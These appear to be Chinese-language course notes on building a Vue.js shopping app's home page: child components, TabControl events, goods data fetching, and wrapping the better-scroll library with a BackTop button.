      | - childComps  home大页面中的子组件都放在这里
```
这样 Home.vue 文件里的结构会非常的清晰

```js 
// Home.vue
<template>
  <div id='home'>

    // 下面的tabbar的结构
    <nav-bar class='home-nav'>
      <template #center>
        <span>购物车</span>
      </template>
    </nav-bar>

    // swiper的结构 这样home.vue不用管swiper内部是怎么实现的 只需要给这些小组件整合到一起就好
    <home-swiper :banners='banners'></home-swiper>
  </div>
</template>
```  

<br>

### **流程**
1. 我们在home文件夹下创建了一个childComps文件夹 用于放跟home相关的子组件 在这里我们创建了 HomeSwiper.vue组件

2. 在 HomeSwiper.vue 组件中引入两个轮播的组件, 并注册
```js 
  import {Swiper, SwiperItem} from 'components/common/swiper/index'
  export default {
    name: "HomeSwiper",
    components: {
      Swiper,
      SwiperItem
    }
  }
```

3. 因为数据在home.vue里面 所以要使用props去接收数据  
要点: 我们可以banners定义默认值的时候 因为type是对象 或者 数组的时候 我们要使用default函数的形式
```js 
props: {
  banners: {
    type: Array,
    default() {
      return []
    }
  }
}
```

4. 在home.vue组件中 要使用v-bind绑定父组件的变量
```js 
// 让假糖 变成 真糖
<home-swiper :banners='banners'></home-swiper>
```

<br><br>

# 首页开发 - 推荐信息的展示
上面轮播图的部分已经完成, 下面就是 推荐部分

老师说 每一个部分其实都是一个组件 我们也在home的childComps中创建 推荐的组件(recommendView.vue)

我们定义了一个组件 准备展示在home.vue文件上, 但是数据在home上 所以recommendView.vue还是需要用props用来接收父组件中的数据

```js 
<template>
  <div class='recommend'>
    <div v-for='(item, index) of recommends' :key='index' class="recommend-item">
      <a :href="item.link">
        <img :src="item.image">
        <div>{{item.title}}</div>
      </a>
    </div>
  </div>
</template>


export default {
  name: 'RecommendView',
  props: {
    recommends: {
      type: Array,
      default() {
        return []
      }
    }
  }
}
```

<br><br>

# 首页开发 - featrueView的封装
这个部分整体就是一张图片, 但仅是一张图片也不推荐直接在home.vue中直接<img>插入 我们还是通过组件的形式, 即使再简单我们也要给这个部分封装成一个组件 再在home.vue中引入

独立的组件一般都会有一个根
```js 
<template>
  <div>

  </div>
</template>
```

1. 在home文件夹的childComps文件夹里面创建 FeatureView.vue
```js 
<template>
  <div class='feature'>
    <a href="https://act.mogujie.com/zzlx67">
      <img src="~assets/img/home/recommend_bg.jpg" alt="">
    </a>
  </div>
</template>
```

2. 在home.vue文件中引入注册组件  
这个部分没有太难的东西, 所以什么有什么好记录的

关于css的部分可以记录下  
nav-bar的位置因为定位了 所以宽度丢失 这里有两种方案解决
```css
  position:fixed
  top:0
  left:0
  right:0
```

这样宽度就被撑起来了 或者 不加left和right 加width100%  
另外就把这个组件当做一个html文档来写就可以 组件没什么特别的当做网页来操作就可

<br><br>

# 首页开发 - TabControl的封装
这个部分就是一个 选项卡(tabcontrol)似的东西 因为多个页面也能用的到 所以我们可以给它在公共组件(components - content)里进行封装
```js 
+------------------+
  最新   流行   新品
+------------------+
```

<br>

### **只是文字不一样的时候就没必要搞插槽了**
我们发现类似上面的结构在多页面中都需要使用, 之前我们想到可以定义插槽, 但是如果只是文字不一样的话就没必要定义插槽了(定义插槽后重复的代码量多增多)

<br>

### **不搞插槽怎么做?**
我们使用props 调用的时候只需要告诉我文字是什么 有几组文字 我来决定选项卡页面中有几个选项卡

```
  选项卡组件 创建 props 用来接收 父组件(home)中的变量
  选项卡组件 根据 父组件中的变量 遍历 选项卡的数量

  那么只需要 父组件定义变量即可 就是说不用插槽 而是使用 父传子
```

<br>

### **阶段1**
完成根据父组件的变量 展示选项卡
因为只有文字不一样 我们使用的是 props 父传子

```js 
props: {
  titles: {

    // 定义了类型 我们要求父组件中需要传递数组
    type: Array,
    default() {
      return []
    }
  }
}

// 根据父组件中的数据 来进行v-for展示 结果放在了span里面
<div v-for='(item, index) of titles' :key='item'  class='tab-control-item' >
  <span>{{item}}</span>
</div>


// 父组件
<tab-control :titles="['流行', '新款', '精选']"></tab-control>
```

<br>

### **阶段2**
上面做完了后并没有样式, 这个阶段我们处理一下 选项卡的样式 我们在 TabControl.vue文件中处理

```css 
.tab-control {
  display : flex;
  text-align: center;
  font-size:15px;
  height:40px;
  line-height: 40px;
}

.tab-control-item {
  flex:1;
}

.tab-control-item span {
  padding:5px;
}
```

<br>

### **阶段3**
样式处理好后, 我们处理点击效果, 当点击文字后 文字会变色 同时下方会出现横线

```js 
// 先准备好样式
.active {
  color:var(--color-high-text);
}

// 点击文字后 span出现下线 所以要这么写选择器
.active span {
  border-bottom: 2px solid var(--color-tint);
}
```

使用v-bind绑定class 在组件中创建 currentIndex 变量, 点击的文字的时候将index 传递给 currentIndex 
```js 
// 标签中可以这样, 样式最终会合并到一起
<div class='test' :class="{active: currentIndex === index}">
```

<br>

### **阶段4**
TabControl 吸顶效果

**思路:**  
监听滚动, 一旦到了某个位置后 将我们的选项卡 改为 position:fixed, 监听向下滚动 到某个位置后 将我们的选项卡的 fixed 属性删除

但是我们不使用上面的方法   
我们再home.vue文件中处理, 因为假如我们在TabControl.vue文件中处理 那么就意味着只要调用我们组件的地方 都会有这个效果

目前这个效果只有home.vue文件中需要, 所以我们在home.vue文件中使用

```css
.tab-control {
  position:sticky;

  // 必须写这个 还挺好用
  top:66px;
}
```

**原理:**  
当这个元素没有到某个位置之前 这个元素的position是static  
当这个元素达到了某个位置之后 这个元素的position被浏览器改为sticky

<br><br>

# 首页开发 - 保存商品的数据结构设计
接下来我们开始开发商品列表了 首先我们需要把数据请求回来
另外 在我们点击最新, 流行, 新品 按钮的时候 下面的列表中的图片没有换

```js 
+------------------+
  流行   新款   精选
+------------------+
```

因为Vue会对内部的组件进行复用 比如我点击最新上面有很多的图片, 当我点击流行的时候 vue会将最新上的图片(组件)进行复用 这样就会出现一个问题

原来组件中展示的图片, 当想展示新的图片的时候 图片就不会展示出来

解决方案就是加一个 :key

上面bug的原因知道了 我们自己做的时候就可以避免了 接下来我们就需要展示自己的商品列表


我们请求的数据会有些复杂, 因为我们既要展示流行的数据 也要展示新款的数据, 还要展示精选的数据 也就是说我的首页里面有所有的数据, 要根据不同的点击展示不同的数据

也就是说我们要定义一个变量 来保存所有的数据  
goods: /流行/新款/精选

当用户点击 流行 的时候 我们从goods中取出流行的数据展示在页面上, 以此类推
那就是说在变量中应该存放着所有的数据, 不能点击的时候再发送对应的请求那么给用户的延迟就会比较长

我们看看 保存数据的变量的模型

```js 
goods: {
  'pop': {page:1, list: []},
  'news': {page:1, list: []},
  'sell': {page:1, list: []}
}
```

page 记录数据当前加载的时候加载到第几页的  
list 流行对应的所有数据都是保存在list中

比如流行加载到第 5 页了 list里面保存着150条数据  
'pop': {page:5, list: [150]},  
'news': {page:2, list: [60]},


goods中保存着3类数据, 我们这么设计 goods 本身是一个对象, 里面有3个对象分别对应着流行 新款 精选

当用户点击 流行 按钮的时候 我们就把 pop 数据想办法取出来 然后展示list中的150条数据

当用户点击 新款 的时候, 我们就在页面上加载60条数据, 如果用户在新款中做了 上拉加载更多 的操作 我们发现用户做了这样的操作后 又加载了30条数据 就需要把

'news': {page:2, list: [60]},

list中的60条数据 改成90条了 同时还要把page2 改成 page3 所以page 和 list一个是用来记录当前数据加载到第几页的 和 当前已加载的数据的

因为我们请求的数据都在home页 所以我们将 goods 变量定义在home.vue中的data中

```js 
goods: {
  'pop': {
    page: 0,
    list:[]
  },
  'news': {
    page: 0,
    list:[]
  },
  'sell': {
    page: 0,
    list:[]
  }
}
```

结构设计好后 我们就将请求回来的数据 塞到list中同时更改page

<br><br>

# 首页开发 - 首页数据的请求和保存
最新接口: http://152.136.185.210:7878/api/m5

上面我们设计了一个模型用来保存数据, 接下来我们就要看怎么将数据请求下来

```js 
goods: {
  'pop': { page: 0, list:[] },
  'news': { page: 0, list:[] },
  'sell': { page: 0, list:[] }
}
```

我们当前模型中是没有任何数据的, 我们先把每一个分类的第一页的数据默认请求下来

方便用户切换按钮的时候数据能够正常的展示, 第2 3页只有当用户在分类内选择上拉加载更多的时候再请求更多的数据

既然是请求数据 跟请求数据相关的操作我们都做了一层封装 都放在了 network -- home.js 文件里了

这个函数也需要传递过来一些参数 因为我们要针对不同的情况请求不同的数据  
123.207.32.32:8000/home/data?type=sell&page=1

type是类型 我们请求哪一个分类 一个有3个 pop new sell  
还有页码只有告诉页码 才能请求对应的数据
```js 
export function getHomeGoods(type, page) {
  return request({
    url:'/home/data',
    params: {
      type,
      page
    }
  })
}
```

上面我们定义好了请求数据的函数, 接下来我们在哪个组件? 什么时候发送请求呢?

因为是home.vue的数据, 所以也在这个组件中 来获取数据, 同样也是在组件一创建的时候获取各个分类(pop new sell)第一页的数据 便于展示

但是我们思考一个问题, 假如我们获取数据, 保存数据的操作都在created函数中进行, 那么当以后需要获取数据的地方越来越多 created函数中的代码量和逻辑就会越来越多不方便管理

created是一个比较特殊的函数 一旦组件创建后vue就会执行这个函数, 所以这个函数内部需要放主要的逻辑, 而类似这种重复性的处理函数内部数据的功能 我们在methods属性中定义

我们只在created函数中 放主要的逻辑 至于具体的操作我们放在methods中进行
```js 
created() {
  // 请求数据(轮播图和下面的模块)
  this.getHomeMultidata()

  // 请求商品列表的数据 默认请求第一页 30条
  this.getHomeGoods('pop');
  this.getHomeGoods('new');
  this.getHomeGoods('sell');
}
```

这样 created 中的逻辑就会很清晰 上面都要使用this 因为调用的是methods中的方法, 使用this才是在使用组件内部的方法, 不使用this就会去全局中找这个方法

在methods中 我们再对请求数据的函数进行一层封装, 函数名定义成跟请求数据的函数名一样

这样的话 我相当于对请求数据的函数又包装了一层 包装在了methods里面 在methods里面进行一些具体的相关请求 然后在created中调用函数 这样created中的逻辑就会很清晰

```js 
methods: {

  // 请求轮播图数据的函数
  getHomeMultidata() {
    getHomeMultidata().then(res => {
        this.banners = res.data.banner.list
        this.recommends = res.data.recommend.list
      })
    },
  }

  /*
    形参type:
    这里对商品列表的请求数据的函数再做一层封装, 定义个形参type, 这样一个方法可以通过传参请求不同的数据
  */
  getHomeGoods(type) {

    /*
      里面请求数据的函数的形参 我们添加了 page 并没有写死

      page写死也不好, 因为当用户进行上拉加载更多的时候 这个方法会复用 写死了怎么复用

      应该是 goods:{ 'pop': { page : 0 }}
      原来的页码+1

      比如第一次请求数据(pop分类)的时候 我们在url的后面传递的是page=1
      如果上拉加载更多的时候 page 应该 +1

      let page = this.goods[type].page + 1

      当第一页请求完毕后 我们要把goods中的对应对象的page改为 新的page
    */

    // 上拉加载更多 page+1 的逻辑, 根据type取到指定对象(pop new sell)的page
    let page = this.goods[type].page + 1

      getHomeGoods(type, page).then(res => {

        // 将res中的数据保存在 goods 中 对应的分类的list数组里 res.data.list是一个数组, 我们要将这个数组中的元素 放入 goods中的list数组里
        this.goods[type].list.push(...res.data.list);
        
        // 修改goods中的page
        this.goods[type].page += 1;
      })
    }
  }
```

<br><br>

# 首页开发 - 首页商品数据的展示
前面已经把商品列表的部分的数据请求下来了保存在了home.vue中, 接下来就是开始封装组件展示在home页中
思路
``` 
+------------+
+   +----+   +
+   +    +   +
+   +----+   +
+            +
+------------+
```

整个商品列表的部分是一个大组件, 里面是每一个小结构就是一个小组件 之后通过遍历的方式往大组件里面去塞小组件 这个组件是会被复用的, 所以我们在components中的content里面创建

这里再说下组件化开发 我们把网页中的每一个部分当做一个组件, 将这个部分封装成一个个的组件再展示在页面中

<br>

### **具体步骤**
1. 我们在 components - content - goods - GoodsList / GoodsListItem 创建了两个组件 分别是 整体的大组件(GoodsList) 和 每一个商品的小组件(GoodsListItem)

我们将GoodsList在home.vue中导入 注册 并 使用 为了将大组件展示在home.vue中
```js 
// 我们在home.vue中使用了 goods-list组件
<goods-list><goods-list>

import GoodsList from 'components/content/goods/GoodsList'
```


2. 数据在组件中的传递 home.vue -- > GoodsList.vue   
数据都是在home.vue中发送请求, 获取数据 保存数据, 那么我们 GoodsList.vue 组件中要展示商品列表肯定也要使用到 数据所以我们要拿到home.vue中的数据 便于展示
```
我们要在这一个大组件里根据按钮的点击展示对应的数据, 下面我们先拿展示 流行模块第一页数据为例 之后我们再添加点击按钮展示对应模块的数据的功能
```

因为只是数据不一样 我们还是通过props来进行操作
```js 
// GoodsList.vue 子组件
<div class="goods">
  // 我们根据这个数据决定遍历多少个小的item 放到这里面就可以了
  // 这里 goods 是一个数组, item是数组中的每一个对象
  <goods-list-item v-for='(item, index) of goods' :key='index'></goods-list-item>
</div>

// 我们在子组件中定义props 来接收 父组件中的数据
props: {
  goods: {
    type: Array,
    default() {
      return []
    }
  }
}

// home.vue 父组件
// 我们在父组件中使用 子组件的变量goods来接收 goods - pop - list中的数据
<goods-list :goods=goods['pop'].list><goods-list>
// 我们将goods中的pop的list中的数据拿出来 给子组件GoodsList使用
```


3. 数据在组件中的传递 GoodsList.vue  -- > GoodsListItem.vue  
大组件中是每一个小组件, 每一个小组件中的内容对应着父组件goods数组中的每一个对象 也就是我们的每一个GoodsListItem应该对应着父组件goods数组中的一个对象 所以GoodsListItem.vue 中也要使用props获取GoodsList中传递的数组中的对象
```html
// GoodsListItem.vue中

<template>
  <div class="goods-item">
    <img :src="goodsItem.show.img" alt="">
    <div class="goods-info">
      <p>{{goodsItem.title}}</p>
      <span class="price">{{goodsItem.price}}</span>
      <span class="collect">{{goodsItem.cfav}}</span>
    </div>
  </div>
</template>

<script>
// 我们定义一个变量 goodsItem 用来接收 父组件中的每一个对象数据
props: {
  goodsItem: {
    type: Object,
    deault() {
      return {}
    }
  }
}

/*
  goodsItem 是我们定义的变量 我们在模板中使用的时候要使用 goods-item 这种写法 驼峰的形式在模板中解析不了
*/
  

// 父组件 GoodsListItem
<goods-list-item v-for='(item, index) of goods' :key='index' :goods-item='item'></goods-list-item>

/*
  我们使用 v-bind 绑定 goods-item='item' 这里的 item 是我们遍历goods得到的每一个对象

  这样每一个 goodsItem 变量就是 goods数组中的每一个对象 比如我们在模板中使用 goodsItem 中的图片 可以这样
*/
<img :src="goodsItem.show.img" alt="">

</script>
```


4. 上面数据都已经互相的传递完毕 那我们接下来就可以通过css样式来调整每个组件的展示效果 一般这里还是采用了flex布局

<br><br>

# 首页开发 - 点击 TabControl 按钮切换商品
上面完整了展示商品列表的操作, 但是是写死的, 我们相当于直接手动取得了goods中的pop的数据
```html
<goods-list :goods=goods['pop'].list><goods-list>
```

这样我再点击 流行 新款 精选按钮后就没有对应的切换效果了 我们要通过点击谁动态选择要展示哪一类

**思路:**  
我们要对 流行 新款 精选 按钮做一个点击事件的监听, 注意这个按钮的点击是在一个组件里面 我们要将这个组件内部的点击事件传递到外面(home组件里面)
home组件里会根据你点击了谁 然后做切换数据的操作 所以我们要将组件内的点击事件传递到组件外部
使用 this.$emit()

```
外部 向 内部 传递 使用 props
内部 向 外部 传递 使用 $emit
```

<br>

### **1. 将子组件点击事件传递到外面 使用 $emit**
```js 
// TabControl组件

// 我们要将下面的点击事件传递到组件外部
methods: {
  itemClick(index) {
    this.currentIndex = index;

    // 1. 使用 this.$emit()  自定义事件名 相当于给子组件事件的名字起个别名吧, 也要传出去点了谁 所以把index传递出去
    this.$emit('tabClick', index)
  }
}


// home组件
// 在模板的位置 使用v-on 绑定子组件发射出来的自定义事件
<tab-control :titles="['流行', '新款', '精选']" class='tab-control' @tabClick='tabClick'></tab-control>
```

定义一个tabClick 去本组件的methods定义对应的方法

<br>

### **2. 在父组件中使用 v-on绑定自定义事件**

```js 
// 父组件
<tab-control :titles="['流行', '新款', '精选']" class='tab-control' @tabClick='tabClick'></tab-control>


// 定义 tabClick 的处理函数
tabClick(index) {

// 这里根据 index 来决定 到底是pop new 还是 sell
// <goods-list :goods="goods['pop'].list"></goods-list>

switch(index) {
  case 0:
    this.currentType = 'pop'
    break;
  case 1:
    this.currentType = 'new'
    break;
  case 2:
    this.currentType = 'sell'
    break;
}
```

这样根据index 我们知道了点击了谁, 根据点击了谁 去goods里面取对应的数据 然后将对应的数据传递到GoodsList组件里面

<br>

### **3. 模板中长的结构 要使用计算属性进行整理**
```js 
// 使用计算属性 整理
<goods-list :goods="goods[currentType].list"></goods-list>
// 整理成
<goods-list :goods="showGoods"></goods-list>

computed: {
  showGoods() {
    return this.goods[currentType].list
  }
},
```

<br><br>

# Better-scroll 安装 和  使用
上面首页的效果大致上完成了 但是还有一个问题, 当我们把项目部署到服务器上
用手机去浏览页面的时候, 不会特别流程 会有卡顿等现象

现在我们用的是浏览器自带的滚动效果 这种滚动在移动端会非常卡顿的 为了解决移动端滚动时的卡顿问题, 在移动端滚动更加的顺滑 会使用 iscroll 框架  
但是 iscroll 已经不维护了 我们要改用 better-scroll

我们使用 better-scroll 对原生的滚动效果做一个重构
这里再重申下, 第三方的框架不要在组件中直接使用 我们都要对框架进行一层封装, 避免以后框架不维护了

<br>

**安装 better-scroll:**  
```
npm install better-scroll -S

npm install better-scroll@1.13.2 --save 

npm install @better-scroll/core
// 核心滚动 大部分情况可能只需要一个简单的滚动
```
 
<br>

**在组件内引入 better-scroll:**
```
import BScroll from 'better-scroll'
```

**在生命周期函数中 new BScroll('el', {配置参数}):**  
el通过document.querySelector 选择 或者直接写类名也可以
```js 
// 不能在created中使用 better-scroll 因为template还未挂载到dom中 获取不到节点等
created() {
  不能在这里使用better-scroll
},


// 在这个生命周期中使用
mounted() {
  new BScroll(document.querySelector('.wrapper'))
}
```

<br>

### **注意:**
better-scroll 要求 我们要在滚动内容的外层加一个wrapper并且指定固定高度 需要滚动的内容必须在一个标签里面
```js 
<div class='wrapper'>     给这个wrapper设置固定高度
  <div class='content'>
    这里内容很多 需要滚动
  </div>
</div>
```
也就是说 wrapper 里面只能有一个标签

<br>

### **总结**
better-scroll的使用很简单
1. npm下载
2. 组件中引入 import
3. 在 mounted() {} 中使用new BScroll()创建
```
参数1: 使用document.querySelector选择滚动内容外层的包裹
参数2: 配置选项 是一个对象
```

<br>

**要求:**  
1. 必须有包裹 包裹必须指定高度
2. 包裹内部是一个元素 这个元素内部可以有很多元素 但是对于包裹来说只有一个孩子
```js 
<div class='wrapper'>
  <ul>
    很多内容
  </ul>
</div>
```

<br>

### **扩展知识点**
因为 new BScroll(document.querySelector('.wrapper')) 是在声明周期函数内创建的 假如没有一个变量指向它 它可能会被回收掉 所以最好这样
```js 
data() {
  return {
    scroll: null
  }
},

mounted() {
  this.scroll = new BScroll()
}
```

<br><br>

# Better-scroll 的基本使用解析
**使用 Better-scroll 监听用户滚动到哪个位置了:**  
创建 BScroll 实例
```js 
let bscroll = new BScroll(document.querySelector('.content'));
```

<br>

**使用on绑定 scroll事件:**  
给 bscroll 使用on绑定scroll事件, position参数就是实时滚动到哪里了  
默认情况下bscroll是不可以实时监听滚动位置的 要是想要实时监听滚动的位置的话必须传递第二个配置参数

<br>

### Better-scroll配置参数:
**<font color="#C2185B">probeType:</font>**  
值: 0, 1, 2

作用: 是否实时监测滚动位置
```
0 和 1 都是不实时侦测滚动位置
2 在手指滚动的过程中侦测, 手指离开后的惯性滚动过程中不侦测
3 只要是滚动都侦测, 惯性滚动过程中也侦测
```

```js 
let bscroll = new BScroll(document.querySelector('.content'), { 配置参数 });

let bscroll = new BScroll(document.querySelector('.content'), { 
  probeType:2
});
```

```js 
bscroll.on('scroll', function(position) {
  console.log(position)

  // 结果:
  {
    x:0, y:-1110
  }
})
```

<br>

**<font color="#C2185B">click:</font>**  
如果我么使用better-scroll来管理滚动元素的话, 如果滚动元素中存在着按钮, 默认是不能监听按钮的点击的
```
click: true    (默认是false)
```

<br>

**<font color="#C2185B">taps: true</font>**  
**<font color="#C2185B">keepAlive: true</font>**  
用于在页面切换的时候保持原先的位置

<br>

**<font color="#C2185B">pullUpLoad</font>**  
比如我们滚动到底部的时候出现上拉加载更多, 如果想做上拉加载更多的话, 一旦滚动到最底部的 给我们回调一个事件, 现在我们只是展示了第一页的数据 然后再次上拉请求第二页数据, 再次追加到数组里面, 然后一起展示数组中的所有数据
```
pullUpLoad: boolean
```

这个配置用于做上拉加载功能, 默认为false, 当设置true或者一个object的时候, 可以开启上拉加载

版本2.x之后 这个功能需要再次安装插件
```
npm i @better-scroll/pull-up --save
```

```js 
pullUpLoad: true

pullUpLoad: {
  threshold: 50
}
```

可以配置threshold来决定开始加载的时机, 当上拉加载数据加载完毕后, 需要执行
```
bscroll.finishPullUp()
```

<br>

**使用on给实例绑定 pullingUp 事件:**  
触发时机: 在一次上拉加载的动作后, 这个时机一般用来去后端请求数据   
一旦滚动到最底部 就会触发回调
```js 
bscroll.on('pullingUp', function() {
  // 绑定pulllingUp事件, 当一次上拉加载的时候 执行回调中的代码
})
```

**注意:**  
上拉加载更多 回调只会触发一次, 为了防止多次请求, 所以在触发了一次上拉加载的回调后 内部必须调用 bscroll.finishPullUp() 方法 告诉它 一次加载已经完成
```js 
bscroll.on('pullingUp', function() {
  // 绑定pullingUp事件, 当一次上拉加载的时候 执行回调中的代码
  console.log('上拉加载更多');

  // 发送网络请求, 请求更多页的数据

  // 等数据请求完成, 并且将新的数据展示出来后 执行
  bscroll.finishPullUp()
  bscroll.refresh()
})
```
 
<br>

**<font color="#C2185B">observeImage</font>**  
弹幕上还说 当因图片的问题 没办法判断到没到底部的时候我们可以加上这个属性
```js 
observeImage: true
```

<br>

### **常用方法:**
**<font color="#C2185B">bscroll.refresh()</font>**  
重新计算BetterScroll 当DOM解构发生变化时 确保滚动效果正常; 
```js 
// 每次dom结构更新之后调用这个方法
updated() {
  // 在home.vue组件中 通过获取this.$refs.scroll Scroll.vue组件对象 使用scroll实例的方法
  this.$refs.scroll.scroll.refresh()
}
```

<br>

**<font color="#C2185B">scrollTo(x, y, time(毫秒), easing, extraTransform): </font>**  
滚动到指定位置 time指定动画时间; 

上面我们创建了 scroll实例对象, 这是实例对象的方法
也就是想回到 滚动区域的顶部 需要通过 scroll实例对象调用scrollTo(x,y)方法

```js 
this.scroll.scrollTo(0, 0)
this.$refs.scroll.scroll.scrollTo(0, 0, 500)
```

<br>

### **常用事件**
**<font color="#C2185B">refresh</font>**  
重新计算BetterScroll 当DOM解构发生变化时 确保滚动效果正常; 
```js 
bs.on('refresh', () => { ... })
```

<br>

下面的事件必须注册相应插件才能使用:   
**pullingDown(pull-down)下拉刷新:** 
```js 
import BScroll from '@better-scroll/core'
import Pulldown from '@better-scroll/pull-down'
//注册插件
BScroll.use(Pulldown)
export default {
  name: 'App',
  mounted() {
    this.$nextTick(() => {
      let bs = new BScroll(this.$refs.wrapper, {
        pullDownRefresh: true
    })
    bs.on('pullingDown', (position) => {
      await fetchData()
      console.log('ddd');
      bs.finishPullDown()
    })
    })
  }
}
```

**pullingUp(pull-up)上拉刷新:**
```js  
import BScroll from '@better-scroll/core'
import Pullup from '@better-scroll/pull-up'

BScroll.use(Pullup)
export default {
  name: 'App',
  mounted() {
    this.$nextTick(() => {
      let bs = new BScroll(this.$refs.wrapper, {
        pullUpLoad: true
    })
    bs.on('pullingUp', (position) => {
      // await fetchData()异步请求数据
      console.log('ddd');
      bs.finishPullUp()
    })
    })
  }
}
```

<br>

### **完整代码:**
```js 
const bscroll = new BScroll(document.querySelector('.content'), {
  probeType:3,      // 开始侦测实时滚动位置
  click: true       // 在滚动区域内可以监听点击事件
  pullUpLoad:true   // 开启上拉加载的功能
})

// 给实例绑定 scroll 事件 监听滚动位置
bscroll.on('scroll', function(position) {
  console.log(position)     // {x:0 y:100}
})

// 给实例绑定 pulllingUp 事件 监听一次上拉加载之后 执行回调
bscroll.on('pulllingUp', function() {
  
  // 防止多次请求 2秒内 因为只要没调用 bscroll.finishPullUp() 就不能再次上拉
  setTimeout(() => {
    bscroll.finishPullUp()
  }, 2000)
})
```

我们开看下Vue中代码部分
```html
<script>
import BScroll from 'better-scroll'

export default {
  name: 'Category',
  data() {
    return {
      scroll:null
    }
  },

  // 我们在mounted函数中创建better-scroll实例 created里面取不到dom节点
  // 为什么要创建变量接收实例 因为垃圾回收的机制
  mounted() {
    this.scroll = new BScroll(document.querySelector('.wrapper'), {
      probeType: 2,
      pullUpLoad:true
    }),

    this.scroll.on('scroll', (position) => {
      // console.log(position)
    }),

    this.scroll.on('pullingUp', () => {
      console.log('上拉加载更多');

      // 这里保存下this 因为settimeout中的this指向window
      let that = this;
      setTimeout(function() {
        console.log('进来了')
        that.scroll.finishPullUp();
        // console.log(this)
      }, 2000)
    })
  }
}
</script>

<style scoped>
  .wrapper {
    height:200px;
    background:deeppink;
    overflow-y:hidden;
  }
</style>
```

<br>

### **注意:**
弹幕上有这么写
```js 
this.scroll = new BScroll(this.$refs.wrapper, {
  probeType:2,

  // 如果元素是button 不管true还是false都可以点击 但是如果是div之类的就要设置这个选项
  click:true,         
  mouseWheel:true,
  observeDOM: true
})
```

弹幕上还说 当因图片的问题 没办法判断到没到底部的时候我们可以加上这个属性
```js 
observeImage: true
```

<br><br>

# Better-scroll 在vue项目中使用过程
上面了解了 怎么使用better-scroll 接下来我们看看怎么在home.vue组件中 对 可滚动的区域进行重构 (除了导航最上面的nav-bar的位置其它的部分都需要滚动)

1. 在home.vue组件中 引入 better-scroll
2. 在mounted函数中创建better-scroll的实例 
3. 创建wrapper 创建content 将所有组件放在content中 并且给wrapper指定一个高度
```js 
<div class='wrapper'>     // 指定高度
  <div class='content'>
      ..所有组件..
  </div>
</div>
```

上面讲了一下大概的流程 但是 better-scroll毕竟是一个第三方的库, 如果有一天停止维护 仍然会出现之前我们说过的话题 所以我们还是要对better-scroll进行层封装

然后让 better-scroll --面向-- 封装文件 --面向-- 所有组件  
我们会封装成一个.vue文件, 之后所有涉及到滚动的组件 都使用.vue文件就可以了

<br><br>

# Better-scroll 的封装 以及 使用
上面提到了封装 我们要给它封装到components -- common里面 这样以后的文件中也可以进行复用
```
  | - components
    | - common
      | - scroll
        - Scroll
```

我们在上面的目录里创建了 Scroll.vue 文件 以后只要是有想滚动的部分 我们就可以放入``<scroll>`` 各种组件 ``</scroll>``  
我们在组件中使用组件scroll的时候需要给scroll组件指定一个高度, 因为每个页面中 需要滚动的区域的高度是不一样  
这样每个组件在使用<scroll>组件的时候, 可以通过加class设置滚动区域的高度
```js 
<scroll class='content'>

</scroll>

<style>
  .content {
    height: 我们指定一个高度 也就是定义一个可滚动的区域
  }
</style>
```


这里复习一个下插槽被替换的时候是什么样子的
```js 
<div>
  <slot></slot>
</div>

<组件1> </组件1>
<组件2> </组件2>

使用插槽的时候 <slot> 会被内容完全的替代掉

<div>
  <组件1> </组件1>
  <组件2> </组件2>
</div>
```


因为slot的部分会被完全的替换掉, 而better-scroll的使用需要 包裹 包裹里面只能有一个子元素 因为结构的关系 我们要像下面这么定义 ``<template>``
```js 
<template>
  <div class="wrapper">
    <div class="content">
      <slot></slot>
    </div>
  </div>
</template>
```


知道了上面的结构是什么样子的 接下来我们就要把需要滚动的组件放到插槽里面
```js 
<scroll class='content'>
  <home-swiper :banners="banners"></home-swiper>
  <recommend-view :recommends="recommends"></recommend-view>
  <feature-view></feature-view>
  <tab-control
    :titles="['流行', '新款', '精选']"
    class="tab-control"
    @tabClick="tabClick"
  ></tab-control>
  <goods-list :goods="showGoods"></goods-list>
</scroll>
```

然后 我们需要给 ``<scroll>`` 指定一个可以滚动的区域
这里 除了顶部的 ``<nav-bar>`` 和 底部的 ``<tab-bar>`` 剩下的都是可滚动的区域

页面高度 - 顶部 - 底部  
这里有两种解决的方案
```css
/* 方案一, 利用 css 中 calc() */
.content {
  height: calc(100vh - 93px); 
}

/* 
  方案二, 利用 position absolute 
  假如我们不指定高度的时候 高度默认就是自动
*/
.content {
  position:absolute;
  top:44px;           需要减去的顶部的高度
  bottom:49px;        需要减去的底部的高度
  left:0;   
  right:0;
}
```

<br><br>

# 首页开发 - BackTop组件的封装和使用
首页的开发几乎快完成了, 我们再补充一些功能, 比如在滚动到某一个位置的时候 显示回到顶部按钮
我们把这个功能封装在components -- content 里面

我们创建一个``<back-top>``组件 放在``<scroll>``组件的外面 因为这个``<back-top>``组件不需要一起滚动
而且每一个页面中``<back-top>``组件的位置都是一样 所以 ``<back-top>``组件 的样式在该组件内部定义就可以

当同一样式 就是在组件内部修改 css  
当不统一样式的时候, 在哪个组件内使用就在哪个组件修改css样式
```js 
// BackTop组件
<template>
  <div class="back-top">
    <img src="~assets/img/common/top.png" alt="">
  </div>
</template>
```

上面修改完样式 位置后 我们需要完成点击该按钮 返回顶部的功能 我们想想这个功能在哪完成比较好?  
```
位置1. 在 BackTop.vue 里
位置2. 在 home.vue 里
```

回到顶部的功能 我们需要调用better-scroll中的创建的scroll实例对象的scrollTo()方法来完成  
我一开始想是在 1 里面完成比较好, 但事实上却是比较麻烦 相当于在BackTop.vue监听点击事件 却操作Scroll.vue中的代码
倒是也能实现

```js 
// 位置1 实现方式
// BackTop.vue
<div class="back-top" @click='backClick'>
</div>

// 我们给div绑定点击事件
methods: {
  backClick() {
    this.$emit('backClick');
  }
}

// 然后我们把事件发送出去 并在父组件(home.vue)中接收

// 父组件 home.vue
<back-top @backClick='backClick'></back-top>
// 然后我们在父组件中定义处理方法, 想办法拿到scroll组件中的实例对象 通过调用这个实例对象的方法实现返回顶部的功能
```

但是像这样的话 不太好, 就重复了

既然 位置1 不好操作 不如我们直接在 home.vue 中监听 ``<back-top>`` 组件的点击 因为这个组件就是小按钮不是么  
这样的就不需要在``<back-top>``组件发送$emit了

我们知道元素肯定是能添加各种事件的, 但是组件可以么?

<br>

**但是组件是不能直接绑定事件的, 如果需要比如添加 @事件名.native 修饰符**  
```
Vue3.0中已经删除.native修饰符, 可以直接给组件绑定事件
```

<br>

### **怎么在父组件中获取到子组件中的对象**
通过: ``<标签 ref='属性名'>`` this.$refs.属性名 的方式

```js 
// home.vue 使用 .native 给组件绑定事件
<back-top @click.native='backClick'></back-top>
      
// 也是在home.vue组件中, 在组件标签内 写了 ref='' 的方式获取该组件对象
<scroll class='content' ref='scroll'>
```

